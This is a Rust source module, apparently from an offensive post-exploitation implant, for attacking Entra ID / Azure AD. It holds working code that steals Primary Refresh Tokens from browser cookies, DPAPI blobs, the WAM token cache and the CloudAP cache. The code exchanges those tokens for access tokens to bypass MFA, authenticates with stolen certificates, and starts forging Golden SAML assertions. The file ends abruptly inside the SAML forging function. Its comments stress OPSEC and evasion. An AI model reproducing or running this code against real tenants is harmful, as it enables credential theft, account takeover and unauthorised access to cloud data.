//! Entra ID / Azure AD credential attack capabilities.
//!
//! Post-exploitation module that steals and forges credentials to access
//! cloud resources without traditional credentials or LSASS access:
//!
//! - **Primary Refresh Token (PRT) theft**: Extract the PRT from browser
//!   cookies, DPAPI-protected Browser/CloudAP data, or the Web Account
//!   Manager (WAM) token cache.  A PRT is a JWT issued by Entra ID that
//!   acts as a long-lived refresh token, bypassing MFA for the owning user.
//!
//! - **Pass-the-Certificate (PtC)**: Authenticate to Entra ID using a stolen
//!   or forged X.509 certificate + RSA private key via the OAuth2
//!   client-credentials flow with an RS256 JWT assertion.
//!
//! - **Golden SAML**: Forge a SAML 2.0 assertion that is accepted by Azure
//!   AD / Entra ID as if it came from a legitimate AD FS federation server.
//!   Requires the AD FS token-signing key (extractable from the AD FS
//!   configuration database or DRSM).
//!
//! - **Token utilization**: Query Microsoft Graph, Azure Resource Manager,
//!   and Key Vault using stolen/forged access tokens.
//!
//! **OPSEC**: Tokens are held in memory only. No LSASS access is needed for
//! PRT extraction (browser cookies + DPAPI suffice). No Domain Admin is
//! required for PRT theft — only user-level access to the target session.
//!
//! # Cross-platform design
//!
//! Unlike `adcs_attacks`, `wmi_persistence`, and `vss_pivot` which are
//! entirely Windows-only and carry `#![cfg(windows)]`, this module
//! intentionally omits a module-level `cfg(windows)` gate.  The JWT
//! construction, HTTP token requests, PRT parsing, and SAML assertion
//! forging logic are all pure Rust and compile on any target.  Only the
//! credential-extraction primitives (DPAPI, WAM cache access, cert store)
//! are gated with individual `#[cfg(windows)]` annotations, with
//! `#[cfg(not(windows))]` stubs that return a clear error when the
//! platform cannot supply the credential.

use std::collections::HashMap;
use std::fmt;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use anyhow::{anyhow, bail, Context, Result};
use base64::Engine as _;
use ring::digest::{digest, SHA1_FOR_LEGACY_USE_ONLY, SHA256};
use ring::hmac::Key as HmacKey;
use ring::rand::SystemRandom;
use ring::signature::{RsaKeyPair, RSA_PKCS1_SHA256};
use serde::{Deserialize, Serialize};
use tokio::sync::RwLock;
use uuid::Uuid;

use base64::engine::general_purpose::URL_SAFE_NO_PAD;

// Re-export CloudEnvironment and CertSource from entra_ptc so callers don't
// need to import both modules.
pub use crate::entra_ptc::{CertSource, CloudEnvironment, TokenResponse};

// ---------------------------------------------------------------------------
// Cloud environment helpers (local copies for when entra_ptc is compiled out)
// ---------------------------------------------------------------------------

fn token_endpoint_for(cloud: &CloudEnvironment, tenant_id: &str) -> String {
    match cloud {
        CloudEnvironment::Commercial => {
            format!("https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token")
        }
        CloudEnvironment::Government => {
            format!("https://login.microsoftonline.us/{tenant_id}/oauth2/v2.0/token")
        }
    }
}

fn graph_url_for(cloud: &CloudEnvironment) -> &'static str {
    match cloud {
        CloudEnvironment::Commercial => "https://graph.microsoft.com",
        CloudEnvironment::Government => "https://graph.microsoft.us",
    }
}

fn arm_url_for(cloud: &CloudEnvironment) -> &'static str {
    match cloud {
        CloudEnvironment::Commercial => "https://management.azure.com",
        CloudEnvironment::Government => "https://management.usgovcloudapi.net",
    }
}

fn vault_url_for(vault_name: &str, cloud: &CloudEnvironment) -> String {
    match cloud {
        CloudEnvironment::Commercial => {
            format!("https://{vault_name}.vault.azure.net")
        }
        CloudEnvironment::Government => {
            format!("https://{vault_name}.vault.usgovcloudapi.net")
        }
    }
}

/// Returns the current time as seconds since the UNIX epoch.
fn now_epoch_secs() -> u64 {
    SystemTime::now()
    .duration_since(UNIX_EPOCH)
    .expect("system clock before UNIX epoch")
    .as_secs()
}

// ---------------------------------------------------------------------------
// Primary Refresh Token (PRT) data structures
// ---------------------------------------------------------------------------

/// A stolen Primary Refresh Token with its associated metadata.
///
/// The PRT is a JWT issued by Entra ID that contains:
/// - `isu`: PRT issuer (always "aad")
/// - `sub`: Subject (user object ID)
/// - `upn`: User principal name
/// - `tid`: Tenant ID
/// - `iat` / `exp`: Issued-at / expiry timestamps
/// - `is_refresh_token`: Always true
///
/// The PRT can be used as a `refresh_token` in standard OAuth2 token requests
/// to obtain access tokens for any resource the user has access to.  The PRT
/// bypasses MFA because MFA was already satisfied when the PRT was originally
/// issued.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PrimaryRefreshToken {
    /// The raw PRT JWT value (opaque — Entra ID manages the JWT contents).
    pub prt_value: String,
    /// The session key (base64url-encoded, 32 bytes decoded).  Needed to
    /// prove possession of the PRT in some flows.
    pub session_key: Option<String>,
    /// The user principal name extracted from the PRT JWT claims.
    pub upn: Option<String>,
    /// The tenant ID extracted from the PRT JWT claims.
    pub tenant_id: Option<String>,
    /// The user's object ID (subject claim) from the PRT JWT.
    pub object_id: Option<String>,
    /// When this PRT was stolen (UNIX timestamp).
    pub stolen_at: u64,
    /// Source of the PRT (browser cookie, DPAPI, WAM, CloudAP).
    pub source: PrtSource,
}

/// How the PRT was obtained.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PrtSource {
    /// Extracted from browser cookies (Chrome/Edge `SignInStateCookie` or
    /// Firefox equivalent).
    BrowserCookie,
    /// Decrypted from DPAPI-protected local app data.
    Dpapi,
    /// Extracted from the Web Account Manager (WAM) token cache via
    /// `SecurityUtils.GetToken` or the `Account`/`WebAccount` COM interfaces.
    Wam,
    /// Extracted from the CloudAP (Cloud Authentication Provider) local
    /// cache at `%SystemRoot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\CloudAP`.
    CloudAp,
    /// Provided directly by the operator.
    OperatorProvided,
}

/// An access token obtained by exchanging a PRT or certificate.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AccessToken {
    /// The access token (JWT or opaque).
    pub access_token: String,
    /// Token type (typically "Bearer").
    pub token_type: String,
    /// Seconds until expiry.
    pub expires_in: u64,
    /// Granted scopes (space-separated).
    pub scope: String,
    /// When this token was obtained (UNIX timestamp).
    pub obtained_at: u64,
}

impl AccessToken {
    /// Check if the token is likely expired (with a safety margin).
    pub fn is_expired(&self, margin_secs: u64) -> bool {
        now_epoch_secs() + margin_secs >= self.obtained_at + self.expires_in
    }
}

// ---------------------------------------------------------------------------
// JWT claim parsing (lightweight, no full JWT library needed)
// ---------------------------------------------------------------------------

/// Lightweight JWT claims extraction.  Decodes the payload portion of a JWT
/// (base64url-decodes the middle segment and parses JSON).  Does NOT verify
/// the signature — this is for local inspection of stolen tokens only.
fn decode_jwt_claims(jwt: &str) -> Result<HashMap<String, serde_json::Value>> {
    let parts: Vec<&str> = jwt.split('.').collect();
    if parts.len() != 3 {
        bail!("invalid JWT: expected 3 dot-separated segments, got {}", parts.len());
    }
    let payload_bytes = URL_SAFE_NO_PAD
        .decode(parts[1])
        .context("JWT payload base64url decode failed")?;
    let claims: HashMap<String, serde_json::Value> =
        serde_json::from_slice(&payload_bytes).context("JWT payload JSON parse failed")?;
    Ok(claims)
}

/// Extract common fields from a PRT JWT into a `PrimaryRefreshToken`.
fn parse_prt_jwt(prt_value: &str, session_key: Option<String>, source: PrtSource) -> Result<PrimaryRefreshToken> {
    let claims = decode_jwt_claims(prt_value)?;

    let upn = claims.get("upn").and_then(|v| v.as_str()).map(|s| s.to_string());
    let tenant_id = claims
        .get("tid")
        .or_else(|| claims.get("tenant_id"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());
    let object_id = claims
        .get("sub")
        .or_else(|| claims.get("oid"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    Ok(PrimaryRefreshToken {
        prt_value: prt_value.to_string(),
        session_key,
        upn,
        tenant_id,
        object_id,
        stolen_at: now_epoch_secs(),
        source,
    })
}

// ---------------------------------------------------------------------------
// PRT theft implementation
// ---------------------------------------------------------------------------

/// Primary Refresh Token theft engine.
///
/// Extracts PRTs from multiple sources on a Windows system.  No Domain Admin
/// or LSASS access is required — the PRT is stored in user-accessible
/// locations (browser cookies, DPAPI-protected data, WAM cache, CloudAP cache).
pub struct PrtTheft {
    http_client: reqwest::Client,
    cloud: CloudEnvironment,
}

impl PrtTheft {
    /// Create a new PRT theft engine.
    pub fn new(cloud: CloudEnvironment) -> Result<Self> {
        let http_client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(30))
            .build()
            .context("failed to build HTTP client for PRT theft")?;
        Ok(Self { http_client, cloud })
    }

    /// Steal the PRT from the current system.
    ///
    /// Tries multiple extraction strategies in order of preference:
    /// 1. Browser cookies (Chrome/Edge SignInStateCookie)
    /// 2. DPAPI-protected browser local state
    /// 3. WAM token cache
    /// 4. CloudAP cache
    ///
    /// Returns the first successfully extracted PRT.
    #[cfg(windows)]
    pub fn steal_prt(&self) -> Result<PrimaryRefreshToken> {
        // Strategy 1: Browser cookie extraction (requires browser-data feature)
        #[cfg(all(windows, feature = "browser-data"))]
        if let Ok(prt) = self.steal_prt_from_browser() {
            return Ok(prt);
        }

        // Strategy 2: DPAPI-protected data
        if let Ok(prt) = self.steal_prt_from_dpapi() {
            return Ok(prt);
        }

        // Strategy 3: WAM token cache
        if let Ok(prt) = self.steal_prt_from_wam() {
            return Ok(prt);
        }

        // Strategy 4: CloudAP cache
        if let Ok(prt) = self.steal_prt_from_cloudap() {
            return Ok(prt);
        }

        bail!("all PRT extraction strategies failed")
    }

    /// Non-Windows fallback — always fails because PRT is a Windows-only concept.
    #[cfg(not(windows))]
    pub fn steal_prt(&self) -> Result<PrimaryRefreshToken> {
        bail!("PRT theft is only supported on Windows — the PRT is stored in Windows-specific credential stores")
    }

    /// Extract PRT from browser cookies (Chrome/Edge).
    ///
    /// The PRT is stored in cookies named `SignInStateCookie` under the
    /// `.login.microsoftonline.com` domain.  Modern Chrome (v127+) encrypts
    /// cookies with App-Bound Encryption; the `browser_data` module handles
    /// decryption.
    #[cfg(all(windows, feature = "browser-data"))]
    fn steal_prt_from_browser(&self) -> Result<PrimaryRefreshToken> {
        use crate::browser_data;
        use common::BrowserDataType;

        // Collect cookies from all browser profiles.
        let json = browser_data::collect_browser_data(None, BrowserDataType::Cookies)
            .context("failed to collect browser cookies")?;

        // The function returns a JSON-serialized BrowserDataResult.
        // We only need the cookies array.
        #[derive(serde::Deserialize)]
        struct BrowserResult {
            cookies: Vec<CookieEntry>,
        }
        #[derive(serde::Deserialize)]
        struct CookieEntry {
            host: String,
            name: String,
            value: String,
        }

        let result: BrowserResult =
            serde_json::from_str(&json).context("failed to parse browser data JSON")?;

        // Look for PRT cookies.  Entra ID stores the PRT in a cookie named
        // `SignInStateCookie` on `.login.microsoftonline.com` (commercial)
        // or `.login.microsoftonline.us` (government).
        let domain_suffix = match self.cloud {
            CloudEnvironment::Commercial => "login.microsoftonline.com",
            CloudEnvironment::Government => "login.microsoftonline.us",
        };

        for cookie in &result.cookies {
            if cookie.name == "SignInStateCookie" && cookie.host.contains(domain_suffix) {
                if let Ok(prt) = parse_prt_jwt(&cookie.value, None, PrtSource::BrowserCookie) {
                    return Ok(prt);
                }
            }
        }

        bail!("no SignInStateCookie found in browser cookies")
    }

    /// Extract PRT from DPAPI-protected data.
    ///
    /// Reads the DPAPI master key, decrypts the local state file, and
    /// extracts the PRT from the encrypted credential blob.
    #[cfg(windows)]
    fn steal_prt_from_dpapi(&self) -> Result<PrimaryRefreshToken> {
        // The PRT is stored in DPAPI-protected blobs at:
        //   %LOCALAPPDATA%\\Microsoft\\Windows\\Connections\\PrtCache
        //   %LOCALAPPDATA%\\Microsoft\\Credentials\\*
        // We look for JSON blobs containing "RefreshToken" or "PrimaryRefreshToken".
        let local_app_data = std::env::var("LOCALAPPDATA")
            .context("LOCALAPPDATA not set")?;

        // Check the connections cache
        let connections_dir = format!("{local_app_data}\\Microsoft\\Windows\\Connections");
        if let Ok(entries) = std::fs::read_dir(&connections_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.extension().and_then(|e| e.to_str()) == Some("json") {
                    if let Ok(data) = std::fs::read(&path) {
                        if let Ok(prt) = self.try_parse_prt_blob(&data, PrtSource::Dpapi) {
                            return Ok(prt);
                        }
                    }
                }
            }
        }

        // Check the Credentials folder for DPAPI blobs
        let creds_dir = format!("{local_app_data}\\Microsoft\\Credentials");
        if let Ok(entries) = std::fs::read_dir(&creds_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Ok(data) = std::fs::read(&path) {
                    // Try to find a PRT in the DPAPI blob
                    if let Ok(prt) = self.try_extract_prt_from_dpapi_blob(&data) {
                        return Ok(prt);
                    }
                }
            }
        }

        bail!("no PRT found in DPAPI-protected data")
    }

    /// Extract PRT from the Web Account Manager (WAM) token cache.
    ///
    /// WAM stores tokens in a COM-accessible cache.  We enumerate accounts
    /// via the `AccountsSettingsPane` / `WebAccount` interfaces and look for
    /// Entra ID tokens with `is_refresh_token=true`.
    #[cfg(windows)]
    fn steal_prt_from_wam(&self) -> Result<PrimaryRefreshToken> {
        // WAM token cache path:
        //   %LOCALAPPDATA%\\Microsoft\\TokenBroker\\Accounts\\*
        let local_app_data = std::env::var("LOCALAPPDATA")
            .context("LOCALAPPDATA not set")?;
        let cache_dir = format!("{local_app_data}\\Microsoft\\TokenBroker\\Accounts");

        if let Ok(entries) = std::fs::read_dir(&cache_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Ok(data) = std::fs::read(&path) {
                    if let Ok(prt) = self.try_parse_prt_blob(&data, PrtSource::Wam) {
                        return Ok(prt);
                    }
                }
            }
        }

        bail!("no PRT found in WAM token cache")
    }

    /// Extract PRT from the CloudAP cache.
    ///
    /// CloudAP is the Cloud Authentication Provider — it caches PRTs in
    /// `%SystemRoot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\CloudAP`.
    /// This directory may require SYSTEM access for some entries.
    #[cfg(windows)]
    fn steal_prt_from_cloudap(&self) -> Result<PrimaryRefreshToken> {
        let cloudap_dir = format!(
            "{}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\CloudAP",
            std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string())
        );

        if let Ok(entries) = std::fs::read_dir(&cloudap_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    // Each subdirectory corresponds to a user SID
                    if let Ok(sub_entries) = std::fs::read_dir(&path) {
                        for sub_entry in sub_entries.flatten() {
                            let sub_path = sub_entry.path();
                            if let Ok(data) = std::fs::read(&sub_path) {
                                if let Ok(prt) = self.try_parse_prt_blob(&data, PrtSource::CloudAp) {
                                    return Ok(prt);
                                }
                            }
                        }
                    }
                }
            }
        }

        bail!("no PRT found in CloudAP cache")
    }

    /// Try to parse a PRT from a data blob (JSON or DPAPI-encrypted).
    fn try_parse_prt_blob(&self, data: &[u8], source: PrtSource) -> Result<PrimaryRefreshToken> {
        // Try direct JSON parse
        if let Ok(json_val) = serde_json::from_slice::<serde_json::Value>(data) {
            // Look for PRT in various JSON shapes
            if let Some(prt_str) = self.find_prt_in_json(&json_val) {
                return parse_prt_jwt(&prt_str, None, source);
            }
        }

        // Try UTF-8 string scan for JWT-like patterns
        if let Ok(text) = std::str::from_utf8(data) {
            // Look for eyJ (base64url-encoded JSON) which is a JWT header
            for (i, _) in text.match_indices("eyJ") {
                // Extract until we hit a non-JWT character
                let candidate = &text[i..];
                if let Some(end) = Self::find_jwt_end(candidate) {
                    let jwt = &candidate[..end];
                    if jwt.chars().filter(|c| *c == '.').count() == 2 {
                        if let Ok(prt) = parse_prt_jwt(jwt, None, source) {
                            return Ok(prt);
                        }
                    }
                }
            }
        }

        bail!("no PRT found in blob")
    }

    /// Try to extract PRT from a DPAPI-encrypted blob.
    ///
    /// DPAPI blobs have a recognizable header.  We attempt to search for
    /// JWT-like patterns in the decrypted content.  This is a best-effort
    /// approach — DPAPI decryption requires the user's master key.
    #[cfg(windows)]
    fn try_extract_prt_from_dpapi_blob(&self, data: &[u8]) -> Result<PrimaryRefreshToken> {
        // DPAPI blob header: bytes 0-3 should be 0x01 0x00 0x00 0x00 (version)
        if data.len() < 4 || data[0..4] != [0x01, 0x00, 0x00, 0x00] {
            bail!("not a DPAPI blob");
        }

        // The raw DPAPI blob may contain embedded UTF-16 or UTF-8 strings.
        // Search for JWT patterns in the raw bytes as a fallback.
        let text = String::from_utf8_lossy(data);
        for (i, _) in text.match_indices("eyJ") {
            let candidate = &text[i..];
            if let Some(end) = Self::find_jwt_end(candidate) {
                let jwt = &candidate[..end];
                if jwt.chars().filter(|c| *c == '.').count() == 2 {
                    if let Ok(prt) = parse_prt_jwt(jwt, None, PrtSource::Dpapi) {
                        return Ok(prt);
                    }
                }
            }
        }

        bail!("no PRT found in DPAPI blob")
    }

    /// Recursively search a JSON value for a PRT string.
    fn find_prt_in_json(&self, val: &serde_json::Value) -> Option<String> {
        match val {
            serde_json::Value::Object(map) => {
                // Check known PRT field names
                for key in &["refresh_token", "RefreshToken", "prt", "primary_refresh_token", "SignInStateCookie"] {
                    if let Some(v) = map.get(*key) {
                        if let Some(s) = v.as_str() {
                            if s.starts_with("eyJ") && s.chars().filter(|c| *c == '.').count() >= 2 {
                                return Some(s.to_string());
                            }
                        }
                    }
                }
                // Recurse into nested objects
                for v in map.values() {
                    if let Some(prt) = self.find_prt_in_json(v) {
                        return Some(prt);
                    }
                }
                None
            }
            serde_json::Value::Array(arr) => {
                for v in arr {
                    if let Some(prt) = self.find_prt_in_json(v) {
                        return Some(prt);
                    }
                }
                None
            }
            _ => None,
        }
    }

    /// Find the end of a JWT in a string (first whitespace or end of string).
    fn find_jwt_end(s: &str) -> Option<usize> {
        for (i, c) in s.char_indices() {
            if c.is_whitespace() || c == '"' || c == '\'' || c == '}' || c == ',' || c == ';' {
                if i > 20 {
                    // Minimum plausible JWT length
                    return Some(i);
                }
            }
        }
        if s.len() > 20 { Some(s.len()) } else { None }
    }

    /// Use a stolen PRT to obtain an access token for a specific resource.
    ///
    /// The PRT is used as a `refresh_token` in a standard OAuth2 token
    /// exchange.  Entra ID treats it identically to a regular refresh token,
    /// but the PRT bypasses MFA because MFA was already satisfied when the
    /// PRT was originally issued.
    ///
    /// `resource` should be a valid Entra ID resource URI, e.g.:
    /// - `https://graph.microsoft.com`
    /// - `https://management.azure.com`
    /// - `https://vault.azure.net`
    pub async fn use_prt_for_access(
        &self,
        prt: &PrimaryRefreshToken,
        resource: &str,
    ) -> Result<AccessToken> {
        // Determine the tenant.  Use the tenant from the PRT if available,
        // otherwise fall back to "common" (which will use the home tenant).
        let tenant = prt
            .tenant_id
            .as_deref()
            .unwrap_or("common");

        let token_endpoint = token_endpoint_for(&self.cloud, tenant);

        // Build the token request body.
        let scope = format!("{resource}/.default");
        let params = [
            ("grant_type", "refresh_token"),
            ("client_id", "1b730954-1685-4b74-9bfd-dac224a7b0de"), // Azure AD PowerShell client ID (well-known)
            ("resource", resource),
            ("refresh_token", &prt.prt_value),
            ("scope", &scope),
        ];

        let resp = self
            .http_client
            .post(&token_endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .form(&params)
            .send()
            .await
            .context("PRT token exchange HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "PRT token exchange failed: HTTP {} — {}",
                status,
                body
            );
        }

        let token_resp: TokenResponse = resp
            .json()
            .await
            .context("failed to parse PRT token exchange response")?;

        Ok(AccessToken {
            access_token: token_resp.access_token,
            token_type: token_resp.token_type,
            expires_in: token_resp.expires_in,
            scope: token_resp.scope,
            obtained_at: now_epoch_secs(),
        })
    }

    /// Build a PRT from a raw value provided by the operator.
    ///
    /// This is useful when the operator has obtained a PRT through other
    /// means (e.g., from a different compromised host) and wants to use
    /// it from this agent.
    pub fn prt_from_raw(prt_value: &str, session_key: Option<String>) -> Result<PrimaryRefreshToken> {
        parse_prt_jwt(prt_value, session_key, PrtSource::OperatorProvided)
    }
}

// ---------------------------------------------------------------------------
// Pass-the-Certificate (PtC)
// ---------------------------------------------------------------------------

/// Pass-the-Certificate authenticator.
///
/// Uses a stolen or forged X.509 certificate + RSA private key to
/// authenticate to Entra ID via the OAuth2 client-credentials flow with
/// an RS256 JWT assertion.  This is the same mechanism used by Azure AD
/// App Registrations with certificate credentials.
///
/// The certificate can be:
/// - Stolen from a compromised host (cert + private key on disk)
/// - Extracted from an Azure AD App Registration (via Graph API if you
///   have write access to the app)
/// - Self-signed (if you can add it to an app registration)
pub struct PassTheCert {
    tenant_id: String,
    client_id: String,
    cloud: CloudEnvironment,
    cert_der: Vec<u8>,
    key_pair: Arc<RsaKeyPair>,
    http_client: reqwest::Client,
    cached_token: RwLock<Option<AccessToken>>,
}

impl fmt::Debug for PassTheCert {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("PassTheCert")
            .field("tenant_id", &self.tenant_id)
            .field("client_id", &self.client_id)
            .field("cloud", &self.cloud)
            .field("cert_der_len", &self.cert_der.len())
            .finish_non_exhaustive()
    }
}

/// Builder for [`PassTheCert`].
pub struct PassTheCertBuilder {
    tenant_id: Option<String>,
    client_id: Option<String>,
    cloud: CloudEnvironment,
    cert_source: Option<CertSource>,
    http_proxy: Option<String>,
}

impl PassTheCertBuilder {
    /// Set the Entra ID tenant (directory) ID.
    pub fn tenant_id(mut self, tenant_id: impl Into<String>) -> Self {
        self.tenant_id = Some(tenant_id.into());
        self
    }

    /// Set the application (client) ID.
    pub fn client_id(mut self, client_id: impl Into<String>) -> Self {
        self.client_id = Some(client_id.into());
        self
    }

    /// Set the cloud environment.
    pub fn cloud(mut self, cloud: CloudEnvironment) -> Self {
        self.cloud = cloud;
        self
    }

    /// Set the certificate source.
    pub fn cert_source(mut self, source: CertSource) -> Self {
        self.cert_source = Some(source);
        self
    }

    /// Set an optional HTTP/HTTPS proxy.
    pub fn http_proxy(mut self, proxy: impl Into<String>) -> Self {
        self.http_proxy = Some(proxy.into());
        self
    }

    /// Build the PassTheCert authenticator.
    pub fn build(self) -> Result<PassTheCert> {
        let tenant_id = self
            .tenant_id
            .ok_or_else(|| anyhow!("tenant_id is required"))?;
        let client_id = self
            .client_id
            .ok_or_else(|| anyhow!("client_id is required"))?;
        let cert_source = self
            .cert_source
            .ok_or_else(|| anyhow!("cert_source is required"))?;

        let (cert_der, key_der) = match cert_source {
            CertSource::Der { cert_der, key_der } => (cert_der, key_der),
            CertSource::Pem { cert_pem, key_pem } => {
                let cert_der = pem_to_der_local(&cert_pem)?;
                let key_der = pem_to_der_local(&key_pem)?;
                (cert_der, key_der)
            }
        };

        let key_pair = RsaKeyPair::from_der(&key_der)
            .map_err(|e| anyhow!("failed to parse RSA private key: {e:?}"))?;

        let mut http_builder = reqwest::Client::builder();
        if let Some(ref proxy) = self.http_proxy {
            let proxy = reqwest::Proxy::all(proxy).context("invalid proxy URL")?;
            http_builder = http_builder.proxy(proxy);
        }
        let http_client = http_builder
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(30))
            .build()
            .context("failed to build HTTP client")?;

        Ok(PassTheCert {
            tenant_id,
            client_id,
            cloud: self.cloud,
            cert_der,
            key_pair: Arc::new(key_pair),
            http_client,
            cached_token: RwLock::new(None),
        })
    }
}

/// PEM → DER stripping helper (local copy to avoid importing entra_ptc).
fn pem_to_der_local(pem: &str) -> Result<Vec<u8>> {
    let stripped = pem
        .lines()
        .filter(|line| !line.starts_with("-----BEGIN") && !line.starts_with("-----END"))
        .collect::<String>();
    base64::engine::general_purpose::STANDARD
        .decode(stripped.trim())
        .context("PEM base64 decode failed")
}

/// JWT header for RS256.
#[derive(Serialize, Deserialize)]
struct JwtHeader {
    alg: &'static str,
    typ: &'static str,
    x5t: String,
}

/// JWT claims for client assertion.
#[derive(Serialize, Deserialize)]
struct JwtClaims {
    aud: String,
    iss: String,
    sub: String,
    jti: String,
    nbf: u64,
    exp: u64,
}

/// Compute SHA-1 thumbprint of a DER certificate (base64url-encoded).
fn cert_thumbprint(cert_der: &[u8]) -> String {
    let hash = digest(&SHA1_FOR_LEGACY_USE_ONLY, cert_der);
    URL_SAFE_NO_PAD.encode(hash.as_ref())
}

/// Build and sign a JWT assertion for client-credentials flow.
fn build_and_sign_jwt(
    key_pair: &RsaKeyPair,
    cert_der: &[u8],
    client_id: &str,
    token_endpoint: &str,
) -> Result<String> {
    let rng = SystemRandom::new();

    let header = JwtHeader {
        alg: "RS256",
        typ: "JWT",
        x5t: cert_thumbprint(cert_der),
    };
    let header_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?);

    let now = now_epoch_secs();
    let claims = JwtClaims {
        aud: token_endpoint.to_string(),
        iss: client_id.to_string(),
        sub: client_id.to_string(),
        jti: Uuid::new_v4().to_string(),
        nbf: now,
        exp: now + 600,
    };
    let claims_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&claims)?);

    let signing_input = format!("{header_b64}.{claims_b64}");
    let mut signature = vec![0u8; key_pair.public().modulus_len()];
    key_pair
        .sign(&RSA_PKCS1_SHA256, &rng, signing_input.as_bytes(), &mut signature)
        .map_err(|e| anyhow!("RSA signing failed: {e:?}"))?;

    let sig_b64 = URL_SAFE_NO_PAD.encode(&signature);
    Ok(format!("{signing_input}.{sig_b64}"))
}

impl PassTheCert {
    /// Create a new builder.
    pub fn builder() -> PassTheCertBuilder {
        PassTheCertBuilder {
            tenant_id: None,
            client_id: None,
            cloud: CloudEnvironment::Commercial,
            cert_source: None,
            http_proxy: None,
        }
    }

    /// Authenticate to Entra ID using the certificate and obtain an access token.
    ///
    /// `scopes` should be something like `&["https://graph.microsoft.com/.default"]`.
    pub async fn authenticate_with_cert(&self, scopes: &[&str]) -> Result<AccessToken> {
        let token_endpoint = token_endpoint_for(&self.cloud, &self.tenant_id);
        let scope_str = scopes.join(" ");

        let assertion = build_and_sign_jwt(
            &self.key_pair,
            &self.cert_der,
            &self.client_id,
            &token_endpoint,
        )?;

        let params = [
            ("grant_type", "client_credentials"),
            ("client_id", &self.client_id),
            ("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"),
            ("client_assertion", &assertion),
            ("scope", &scope_str),
        ];

        let resp = self
            .http_client
            .post(&token_endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .form(&params)
            .send()
            .await
            .context("PtC token request HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("PtC token request failed: HTTP {} — {}", status, body);
        }

        let token_resp: TokenResponse = resp
            .json()
            .await
            .context("failed to parse PtC token response")?;

        let access_token = AccessToken {
            access_token: token_resp.access_token,
            token_type: token_resp.token_type,
            expires_in: token_resp.expires_in,
            scope: token_resp.scope,
            obtained_at: now_epoch_secs(),
        };

        // Cache for future use
        {
            let mut cache = self.cached_token.write().await;
            *cache = Some(access_token.clone());
        }

        Ok(access_token)
    }

    /// Get a cached token or obtain a new one.
    pub async fn get_token(&self, scopes: &[&str]) -> Result<AccessToken> {
        {
            let cache = self.cached_token.read().await;
            if let Some(ref cached) = *cache {
                if !cached.is_expired(60) {
                    return Ok(cached.clone());
                }
            }
        }
        self.authenticate_with_cert(scopes).await
    }

    /// Return the tenant ID.
    pub fn tenant_id(&self) -> &str {
        &self.tenant_id
    }

    /// Return the client ID.
    pub fn client_id(&self) -> &str {
        &self.client_id
    }
}

// ---------------------------------------------------------------------------
// Golden SAML
// ---------------------------------------------------------------------------

/// SAML 2.0 assertion claim set.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SamlClaims {
    /// Subject NameID (e.g., user principal name).
    pub subject: String,
    /// Audience restriction (e.g., `urn:federation:MicrosoftOnline`).
    pub audience: String,
    /// Issuer (AD FS federation service name, e.g., `http://adfs.example.com/adfs/services/trust`).
    pub issuer: String,
    /// Additional attribute claims (e.g., `{"email": "user@corp.com", "upn": "user@corp.com"}`).
    #[serde(default)]
    pub attributes: HashMap<String, String>,
    /// Not-before timestamp (ISO 8601).
    #[serde(default)]
    pub not_before: Option<String>,
    /// Not-on-or-after timestamp (ISO 8601).
    #[serde(default)]
    pub not_on_or_after: Option<String>,
}

impl Default for SamlClaims {
    fn default() -> Self {
        Self {
            subject: String::new(),
            audience: "urn:federation:MicrosoftOnline".to_string(),
            issuer: String::new(),
            attributes: HashMap::new(),
            not_before: None,
            not_on_or_after: None,
        }
    }
}

/// Golden SAML token forger.
///
/// Forges a SAML 2.0 assertion that Azure AD / Entra ID will accept as if
/// it came from a legitimate AD FS federation server.  This requires the
/// AD FS token-signing private key, which can be extracted from:
///
/// 1. The AD FS configuration database (via the AD FS management snap-in or
///    the `Get-AdfsCertificate` PowerShell cmdlet).
/// 2. The AD FS Distributed Replay System Manager (DRSM) auto-rollback
///    feature — the signing key is rolled every 20 days and the old key
///    remains valid for 5 days, creating a window for extraction.
/// 3. Direct export from the AD FS server's certificate store.
///
/// Once the token-signing key is obtained, any SAML assertion can be forged
/// for any user in the federated domain, bypassing MFA and password checks.
pub struct GoldenSaml;

impl GoldenSaml {
    /// Forge a SAML 2.0 assertion signed with the AD FS token-signing key.
    ///
    /// The assertion is a self-signed XML document that mimics what AD FS
    /// would produce.  Azure AD validates the signature against the federation
    /// trust configuration — if the token-signing certificate matches, the
    /// assertion is accepted.
    ///
    /// `token_signing_cert_der` is the DER-encoded X.509 certificate for the
    /// AD FS token-signing certificate.  `token_signing_key_der` is the
    /// DER-encoded PKCS#8 RSA private key.
    ///
    /// Returns the forged SAML assertion as an XML string.
    pub fn forge_saml_token(
        token_signing_cert_der: &[u8],
        token_signing_key_der: &[u8],
        claims: &SamlClaims,
    ) -> Result<String> {
        let key_pair = RsaKeyPair::from_der(token_signing_key_der)
